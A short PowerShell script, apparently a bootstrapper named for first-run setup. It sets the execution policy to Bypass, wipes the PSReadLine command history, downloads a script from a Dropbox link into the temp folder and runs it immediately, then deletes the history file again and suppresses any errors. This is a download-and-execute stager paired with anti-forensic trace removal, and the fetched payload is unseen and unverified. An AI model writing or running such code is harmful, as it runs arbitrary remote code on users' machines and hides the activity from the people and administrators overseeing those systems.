# Set execution policy to bypass for this process
Set-ExecutionPolicy Bypass -Scope Process -Force

# Remove PSReadLine history files (fixed path to use environment variable)
Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine*" -Force -Recurse -ErrorAction SilentlyContinue

$scriptUrl = "https://www.dropbox.com/scl/fi/b6uehshjuj4wgufh8v0he/Setup-1st-run.ps1?rlkey=wu307ll24vqiqjtel8bymtbrf&st=x1yedsk5&dl=1"
$downloadPath = "$env:TEMP\Setup-1st-run.ps1"
$historyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

try {
    # Download and run
    Invoke-WebRequest -Uri $scriptUrl -OutFile $downloadPath -UseBasicParsing
    & $downloadPath
} catch {
    exit 1
}

# Forceful PS history deletion (only normal delete method kept)
try {
    if (Test-Path $historyPath) {
        Remove-Item -Path $historyPath -Force -ErrorAction Stop
    }
} catch {
    # Silently fail if deletion doesn't work
}